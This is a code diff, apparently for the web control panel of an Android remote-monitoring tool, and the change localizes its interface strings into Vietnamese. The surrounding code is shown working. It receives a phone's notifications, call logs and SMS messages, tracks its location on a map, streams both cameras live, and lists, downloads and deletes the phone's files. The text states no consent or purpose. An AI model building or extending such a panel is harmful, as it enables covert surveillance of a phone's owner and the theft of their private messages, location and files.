@@ -66,48 +66,48 @@ function addNotification(notification) {
   const notificationEl = document.createElement('div');
   notificationEl.className = 'notification';
   notificationEl.innerHTML = `
-    <p><strong>App:</strong> ${notification.appName}</p>
-    <p><strong>Title:</strong> ${notification.title}</p>
-    <p><strong>Text:</strong> ${notification.text}</p>
+    <p><strong>Ứng dụng:</strong> ${notification.appName}</p>
+    <p><strong>Tiêu đề:</strong> ${notification.title}</p>
+    <p><strong>Nội dung:</strong> ${notification.text}</p>
     <p class="timestamp">${notification.timestamp}</p>
   `;
   notificationsDiv.prepend(notificationEl);
   while (notificationsDiv.children.length > 10) {
     notificationsDiv.removeChild(notificationsDiv.lastChild);
   }
-  logDebug(`Received notification from ${notification.appName}`);
+  logDebug(`Nhận thông báo từ ${notification.appName}`);
 }
 
 function addCallLog(call) {
   const callLogEl = document.createElement('div');
   callLogEl.className = 'call-log';
   callLogEl.innerHTML = `
-    <p><strong>Number:</strong> ${call.number}</p>
-    <p><strong>Type:</strong> ${call.type}</p>
-    <p><strong>Date:</strong> ${call.date}</p>
-    <p><strong>Duration:</strong> ${call.duration} seconds</p>
+    <p><strong>Số điện thoại:</strong> ${call.number}</p>
+    <p><strong>Loại:</strong> ${call.type}</p>
+    <p><strong>Ngày:</strong> ${call.date}</p>
+    <p><strong>Thời lượng:</strong> ${call.duration} giây</p>
   `;
   callLogsDiv.prepend(callLogEl);
   while (callLogsDiv.children.length > 10) {
     callLogsDiv.removeChild(callLogsDiv.lastChild);
   }
-  logDebug(`Received call log: ${call.number}`);
+  logDebug(`Nhận nhật ký cuộc gọi: ${call.number}`);
 }
 
 function addSmsMessage(sms) {
   const smsEl = document.createElement('div');
   smsEl.className = 'sms-message';
   smsEl.innerHTML = `
-    <p><strong>Address:</strong> ${sms.address}</p>
-    <p><strong>Type:</strong> ${sms.type}</p>
-    <p><strong>Date:</strong> ${sms.date}</p>
-    <p><strong>Body:</strong> ${sms.body}</p>
+    <p><strong>Số điện thoại:</strong> ${sms.address}</p>
+    <p><strong>Loại:</strong> ${sms.type}</p>
+    <p><strong>Ngày:</strong> ${sms.date}</p>
+    <p><strong>Nội dung:</strong> ${sms.body}</p>
   `;
   smsDiv.prepend(smsEl);
   while (smsDiv.children.length > 50) {
     smsDiv.removeChild(smsDiv.lastChild);
   }
-  logDebug(`Received SMS from ${sms.address}`);
+  logDebug(`Nhận tin nhắn SMS từ ${sms.address}`);
 }
 
 function initMap() {
@@ -125,10 +125,10 @@ function updateMap(latitude, longitude) {
     marker.setLatLng([latitude, longitude]);
   } else {
     marker = L.marker([latitude, longitude]).addTo(map);
-    marker.bindPopup('Device Location').openPopup();
+    marker.bindPopup('Vị Trí Thiết Bị').openPopup();
   }
   map.setView([latitude, longitude], 13);
-  logDebug(`Updated map to lat=${latitude}, lng=${longitude}`);
+  logDebug(`Cập nhật bản đồ: vĩ độ=${latitude}, kinh độ=${longitude}`);
 }
 
 function updateStreams() {
@@ -139,7 +139,7 @@ function updateStreams() {
     videoFront.onloadedmetadata = () => {
       videoFront.play().catch(err => {
         console.error('Autoplay blocked for front:', err);
-        updateStatus('Tap the front video to start playback');
+        updateStatus('Nhấn vào camera trước để phát');
         videoFront.setAttribute('controls', 'true');
       });
     };
@@ -151,42 +151,42 @@ function updateStreams() {
     videoBack.onloadedmetadata = () => {
       videoBack.play().catch(err => {
         console.error('Autoplay blocked for back:', err);
-        updateStatus('Tap the back video to start playback');
+        updateStatus('Nhấn vào camera sau để phát');
         videoBack.setAttribute('controls', 'true');
       });
     };
   }
-  updateStatus('Receiving remote streams');
+  updateStatus('Đang nhận luồng video từ thiết bị');
 }
 
 function reconnectSocket() {
-  updateStatus('Attempting to reconnect to server...');
+  updateStatus('Đang thử kết nối lại tới máy chủ...');
   socket.connect();
 }
 
 socket.on('connect', () => {
-  updateStatus('Connected to signaling server');
+  updateStatus('Đã kết nối tới máy chủ');
 });
 
 socket.on('connect_error', (error) => {
   const message = `Socket.IO connection error: ${error.message} (${error.type})`;
   console.error(message);
-  updateStatus('Failed to connect to server. Retrying...');
+  updateStatus('Kết nối thất bại. Đang thử lại...');
 });
 
 socket.on('id', id => {
   myId = id;
-  logDebug(`Received socket ID: ${myId}`);
+  logDebug(`Nhận ID socket: ${myId}`);
   socket.emit('identify', 'web');
   socket.emit('web-client-ready', myId);
-  updateStatus('Announced readiness to receive stream');
+  updateStatus('Đã sẵn sàng nhận luồng dữ liệu');
 });
 
 socket.on('android-client-ready', id => {
   if (androidClientId !== id) {
     androidClientId = id;
-    logDebug(`Android client ready: ${id}`);
-    updateStatus('Android client connected');
+    logDebug(`Thiết bị Android đã sẵn sàng: ${id}`);
+    updateStatus('Thiết bị Android đã kết nối');
   }
 });
 
@@ -228,7 +228,7 @@ socket.on('signal', async (data) => {
   }
 
   if (!peer) {
-    logDebug('Creating new peer connection');
+    logDebug('Đang tạo kết nối WebRTC mới...');
     try {
       peer = new RTCPeerConnection(config);
       peer.addTransceiver('video', { direction: 'recvonly' });
@@ -259,10 +259,10 @@ socket.on('signal', async (data) => {
       };
 
       peer.oniceconnectionstatechange = () => {
-        logDebug(`ICE connection state: ${peer.iceConnectionState}`);
-        updateStatus(`ICE connection: ${peer.iceConnectionState}`);
+        logDebug(`Trạng thái ICE: ${peer.iceConnectionState}`);
+        updateStatus(`Kết nối ICE: ${peer.iceConnectionState}`);
         if (peer.iceConnectionState === 'failed') {
-          updateStatus('Connection failed, please refresh or retry');
+          updateStatus('Kết nối thất bại, vui lòng làm mới trang hoặc thử lại');
         }
       };
 
@@ -299,7 +299,7 @@ socket.on('signal', async (data) => {
 });
 
 socket.on('android-client-disconnected', () => {
-  updateStatus('Android client disconnected');
+  updateStatus('Thiết bị Android đã ngắt kết nối');
   if (peer) {
     peer.close();
     peer = null;
@@ -314,12 +314,12 @@ socket.on('android-client-disconnected', () => {
     marker.remove();
     marker = null;
   }
-  logDebug('Android client disconnected');
+  logDebug('Thiết bị Android đã ngắt kết nối');
 });
 
 socket.on('error', (error) => {
   console.error('Socket.IO server error:', error);
-  updateStatus(`Server error: ${error.message}`);
+  updateStatus(`Lỗi máy chủ: ${error.message}`);
 });
 
 retryButton.addEventListener('click', reconnectSocket);
@@ -334,11 +334,11 @@ let currentPath = "/storage/emulated/0/";
 function requestFileList(path) {
   logDebug(`[FS] Requesting files for path: ${path}`);
   if (!androidClientId) {
-    updateStatus('No Android client connected');
-    logDebug('[FS] Error: No Android client ID (androidClientId is null)');
+    updateStatus('Chưa có thiết bị Android kết nối');
+    logDebug('[FS] Lỗi: Chưa có ID thiết bị Android');
     return;
   }
-  updateStatus(`Requesting files for: ${path}`);
+  updateStatus(`Đang yêu cầu tệp: ${path}`);
   
   // Explicitly logging the emit
   console.log(`[FS] Emitting fs:list for path: ${path} to ${androidClientId}`);
@@ -353,7 +353,7 @@ function renderFileList(files, path) {
   fileListDiv.innerHTML = '';
   
   if (!files || files.length === 0) {
-    fileListDiv.innerHTML = '<div style="color: #9ca3af; padding: 10px;">This directory is empty.</div>';
+    fileListDiv.innerHTML = '<div style="color: #9ca3af; padding: 10px;">Thư mục này trống.</div>';
     return;
   }
 
@@ -384,7 +384,7 @@ function renderFileList(files, path) {
     name.style.fontWeight = file.isDir ? 'bold' : 'normal';
 
     const size = document.createElement('div');
-    size.textContent = file.isDir ? 'Dir' : formatBytes(file.size);
+    size.textContent = file.isDir ? 'Thư mục' : formatBytes(file.size);
     size.style.fontSize = '0.8rem';
     size.style.color = '#6b7280';
 
@@ -396,7 +396,7 @@ function renderFileList(files, path) {
     if (!file.isDir) {
         const downloadBtn = document.createElement('button');
         downloadBtn.textContent = '⬇';
-        downloadBtn.title = 'Download';
+        downloadBtn.title = 'Tải xuống';
         downloadBtn.style.cssText = 'background: none; border: none; cursor: pointer; margin-right: 8px; font-size: 1.1rem;';
         downloadBtn.onclick = (e) => {
             e.stopPropagation();
@@ -407,11 +407,11 @@ function renderFileList(files, path) {
     
     const deleteBtn = document.createElement('button');
     deleteBtn.textContent = '🗑';
-    deleteBtn.title = 'Delete';
+    deleteBtn.title = 'Xóa';
     deleteBtn.style.cssText = 'background: none; border: none; cursor: pointer; font-size: 1.1rem;';
     deleteBtn.onclick = (e) => {
         e.stopPropagation();
-        if(confirm(`Delete ${file.name}?`)) {
+        if(confirm(`Xóa tệp ${file.name}?`)) {
             deleteFile(file.path);
         }
     };
@@ -441,14 +441,14 @@ function formatBytes(bytes, decimals = 2) {
 }
 
 function requestFileDownload(path) {
-    updateStatus(`Requesting download: ${path}`);
+    updateStatus(`Đang yêu cầu tải xuống: ${path}`);
     if (androidClientId) {
         socket.emit('fs:download', { to: androidClientId, path: path });
     }
 }
 
 function deleteFile(path) {
-    updateStatus(`Deleting: ${path}`);
+    updateStatus(`Đang xóa: ${path}`);
     if (androidClientId) {
         socket.emit('fs:delete', { to: androidClientId, path: path });
         // Optimistically remove or refresh? Refresh is safer.
@@ -492,7 +492,7 @@ socket.on('fs:files', (data) => {
     // msg.put("file_list", data); -> emit('fs:files', msg);
     // So distinct payload is `data.file_list`.
     
-    logDebug('Received file list');
+    logDebug('Đã nhận danh sách tệp');
     if (data.file_list) {
         renderFileList(data.file_list.files, data.file_list.currentPath);
     }
@@ -501,7 +501,7 @@ socket.on('fs:files', (data) => {
 socket.on('fs:download_start', (data) => {
     // data: { fileId, name, size, totalChunks }
     const { fileId, name, size, totalChunks } = data;
-    logDebug(`[FS] Download start: ${name} (${totalChunks} chunks)`);
+    logDebug(`[FS] Bắt đầu tải: ${name} (${totalChunks} phần)`);
     activeDownloads[fileId] = {
         name: name,
         buffer: new Array(totalChunks),
@@ -509,7 +509,7 @@ socket.on('fs:download_start', (data) => {
         receivedChunks: 0,
         startTime: Date.now()
     };
-    updateStatus(`Downloading ${name} (0%)`);
+    updateStatus(`Đang tải ${name} (0%)`);
 });
 
 socket.on('fs:download_chunk', (data) => {
@@ -526,7 +526,7 @@ socket.on('fs:download_chunk', (data) => {
         // Update progress every 5% or so to avoid UI spam
         const progress = Math.floor((download.receivedChunks / download.totalChunks) * 100);
         if (progress % 5 === 0) {
-            updateStatus(`Downloading ${download.name} (${progress}%)`);
+            updateStatus(`Đang tải ${download.name} (${progress}%)`);
         }
     }
 });
@@ -537,8 +537,8 @@ socket.on('fs:download_complete', (data) => {
     const download = activeDownloads[fileId];
     
     if (download) {
-        logDebug(`[FS] Download complete: ${download.name}`);
-        updateStatus(`Processing ${download.name}...`);
+        logDebug(`[FS] Tải hoàn tất: ${download.name}`);
+        updateStatus(`Đang xử lý ${download.name}...`);
         
         // Verify we have all chunks (optional, but good practice)
         if (download.receivedChunks !== download.totalChunks) {
@@ -551,7 +551,7 @@ socket.on('fs:download_complete', (data) => {
         downloadBase64File(base64Complete, download.name);
         
         const duration = (Date.now() - download.startTime) / 1000;
-        updateStatus(`Downloaded ${download.name} in ${duration}s`);
+        updateStatus(`Đã tải xong ${download.name} trong ${duration}s`);
         
         // Cleanup
         delete activeDownloads[fileId];
@@ -562,7 +562,7 @@ socket.on('fs:download_error', (data) => {
     const { fileId, error } = data;
     if (activeDownloads[fileId]) {
         const name = activeDownloads[fileId].name;
-        updateStatus(`Download failed: ${name}`);
+        updateStatus(`Tải thất bại: ${name}`);
         logDebug(`[FS] Download error for ${name}: ${error}`);
         delete activeDownloads[fileId];
     } else {
@@ -572,11 +572,11 @@ socket.on('fs:download_error', (data) => {
 
 // Deprecated single-blob handler (kept for potential fallback if needed, but likely unused manually)
 socket.on('fs:download_ready', (data) => {
-    logDebug('Received legacy file download data');
+    logDebug('Nhận dữ liệu tải tệp (cũ)');
     if (data.file_data) {
         const { name, content } = data.file_data; 
         downloadBase64File(content, name);
-        updateStatus(`Download ready: ${name}`);
+        updateStatus(`Sẵn sàng tải: ${name}`);
     }
 });
 
@@ -588,6 +588,6 @@ function downloadBase64File(base64Data, fileName) {
     downloadLink.click();
 }
 
-updateStatus('Connecting to server...');
-logDebug('Web client initializing...');
+updateStatus('Đang kết nối tới máy chủ...');
+logDebug('Đang khởi tạo giao diện web...');
 initMap();
